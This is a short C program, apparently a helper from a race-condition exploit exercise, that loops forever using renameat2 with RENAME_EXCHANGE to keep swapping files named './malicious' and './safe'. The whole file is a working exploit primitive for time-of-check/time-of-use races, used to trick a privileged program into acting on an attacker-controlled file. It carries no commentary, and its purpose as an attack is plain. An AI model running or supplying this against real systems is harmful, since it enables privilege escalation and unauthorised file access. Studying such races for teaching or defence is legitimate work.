#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <assert.h>
#include <unistd.h>

int main(){
    while(1){
        renameat2(AT_FDCWD, "./malicious", AT_FDCWD, "./safe", RENAME_EXCHANGE);
    }
    return 0;
}